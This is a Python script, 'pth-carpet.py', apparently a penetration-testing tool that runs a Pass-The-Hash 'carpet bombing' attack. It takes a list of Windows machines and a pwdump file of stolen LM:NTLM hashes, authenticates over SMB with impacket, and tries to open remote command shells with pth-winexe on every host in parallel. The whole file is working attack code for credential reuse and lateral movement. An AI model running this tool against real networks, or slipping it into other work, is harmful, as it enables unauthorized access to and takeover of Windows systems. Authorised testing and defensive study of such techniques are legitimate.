#!/usr/bin/python

#
# Simple script intended to perform Carpet Bombing against list 
# of provided machines using list of provided LSA Hashes (LM:NTLM).
# The basic idea with Pass-The-Hash attack is to get One hash and use it
# against One machine. There is a problem with this approach of not having information,
# onto what machine we could have applied the hash.
# To combat this issue - the below script was born.
#
# Requirements:
#   This script requires 'pth-winexe' utility (or winexe renamed to pth-winexe') be present
#   within system during script's invocation. In case this utility will not be present -
#   no further check upon ability to run commands from PTH attack - will be displayed.
#   Also, modules such as:
#       - impacket
#
# Notice:
#   This script is capable of verifying exploitability of only Windows boxes. In case
#   of other type of boxes (running Samba) pth-winexe will not yield satisfying results.
#
# Usage:
#   $ ./pth-carpet.py machines.txt pwdump
#
# coded by:
#   Mariusz B., 2016 / mgeeky
#   version 0.2
#
# Should be working on Windows boxes as well as on Linux ones.
#

from __future__ import print_function

import os
import sys
import argparse
import signal
import logging
import threading
import subprocess
import multiprocessing

from termcolor import colored
from functools import partial
from multiprocessing.managers import BaseManager
from impacket.dcerpc.v5 import transport

WORKERS = multiprocessing.cpu_count() * 4
TIMEOUT = 10
OPTIONS = None
LOCK = multiprocessing.Lock()

def info(txt):
    with LOCK:
        print (txt)

def success(txt):
    info(colored('[+] '+txt, 'green', attrs=['bold']))

def warning(txt):
    info(colored('[*] '+txt, 'yellow'))

def verbose(txt):
    if OPTIONS.v:
        info(colored('[?] '+txt, 'white'))

def err(txt):
    info(colored('[!] '+txt, 'red'))

class Command(object):
    def __init__(self, cmd):
        self.cmd = cmd
        self.process = None
        self.output = ''
        self.error = ''
        verbose( '\tCalling: "%s"' % cmd)

    def get_output(self):
        return self.output, self.error

    def run(self, stdin, timeout):
        def target():
            self.process = subprocess.Popen(self.cmd, shell=True, \
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            self.output, self.error = self.process.communicate(stdin)

        thread = threading.Thread(target=target)
        thread.start()
        thread.join(timeout)
        if thread.is_alive():
            self.process.terminate()
            thread.join()
            return False
        else:
            return True

def init_worker():
    # http://stackoverflow.com/a/6191991
    signal.signal(signal.SIGINT, signal.SIG_IGN)

def cmd_exists(cmd):
    return subprocess.call("type " + cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0

def check_rce(host, username, hash, port):
    verbose('\tChecking whether provided hash can be used to PTH remote code execution')

    if cmd_exists('pth-winexe'):
        userswitch = '%s%%%s' % (username, hash)
        c = Command('pth-winexe -U %s //%s cmd' % (userswitch, host))
        if c.run('exit\n', TIMEOUT):
            pass
        else:
            verbose('\tPTH-Winexe had to be terminated.')
        out, error = c.get_output()
        if 'Microsoft' in out and '(C) Copyright' in out and '[Version' in out:
            return True
        else:
            errorm = error[error.find('NT_STATUS'):].strip()
            if not errorm.startswith('NT_STATUS'):
                if 'NT_STATUS' in error:
                    errorm = error
                else:
                    errorm = 'Unknown error'
            if OPTIONS.v:
                err('\tCould not spawn shell using PTH: ' + errorm)
    else:
        warning('\tPlease check above hash whether using it you can access writeable $IPC share to execute cmd.')

    return False

def login(host, username, hash, port):
    stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % host

    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    rpctransport.set_dport(port)

    lmhash, nthash = hash.split(':')
    rpctransport.set_credentials(username, '', '', lmhash, nthash, None)

    dce = rpctransport.get_dce_rpc()
    try:
        dce.connect()
        return check_rce(host, username, hash, port)
    except Exception, e:
        raise e

def correct_hash(hash):
    lmhash, nthash = hash.split(':')
    if '*' in lmhash:
        lmhash = '0' * 32
    if '*' in nthash:
        nthash = '0' * 32

    return lmhash + ':' + nthash

def worker(stopevent, pwdump, machine):
    for user, hash in pwdump.items():
        if stopevent.is_set():
            break

        hash = correct_hash(hash)
        try:
            if login(machine, user, hash, OPTIONS.port):
                success('Pass-The-Hash with shell spawned: %s@%s (%s)' % (user, machine, hash))
            else:
                if OPTIONS.v:
                    warning('Connected using PTH but could\'nt spawn shell: %s@%s (%s)' % (user, machine, hash))
        except Exception, e:
            verbose('Hash was not accepted: %s@%s (%s)\n\t%s' % (user, machine, hash, str(e)))
            

def main():
    global OPTIONS

    print(colored('\n\tPass-The-Hash Carpet Bombing utility\n\tSmall utility trying every provided hash against every specified machine.\n\tMariusz B., 2016\n', 'white', attrs=['bold']))

    parser = argparse.ArgumentParser(add_help = True, description='Pass-The-Hash mass checking tool')
    parser.add_argument('rhosts', nargs='?', help='Specifies input file containing list of machines or CIDR notation of hosts')
    parser.add_argument('hashes', nargs='?', help='Specifies input file containing list of dumped hashes in pwdump format')
    parser.add_argument('-v', action='store_true', help='Verbose mode')
    parser.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar='smb port', help='Destination port used to connect into SMB Server')

    if len(sys.argv) < 3:
        parser.print_help()
        sys.exit(1)

    OPTIONS = parser.parse_args()

    machines = [x.strip() for x in open(OPTIONS.rhosts).readlines() ]
    rawpwdump = [x.strip() for x in open(OPTIONS.hashes).readlines() ]
    pwdump = {}

    for p in rawpwdump:
        try:
            user = p.split(':')[0]
            hash = p.split(':')[2] + ':' + p.split(':')[3]
        except:
            err('Supplied hashes file does not conform PWDUMP format!')
            err('\tIt must be like this: <user>:<id>:<lmhash>:<nthash>:...')
            sys.exit(1)
            
        pwdump[user] = hash

    warning('Testing %d hashes against %d machines. Resulting in total in %d PTH attempts\n' \
        % (len(pwdump), len(machines), len(pwdump) * len(machines)))

    stopevent = multiprocessing.Manager().Event()

    try:
        pool = multiprocessing.Pool(WORKERS, init_worker)
        func = partial(worker, stopevent, pwdump)
        pool.map_async(func, machines)
        pool.close()
        pool.join()

    except KeyboardInterrupt:
        pool.terminate()
        pool.join()
        success('\nUser interrupted the script.')

if __name__ == '__main__':
    main()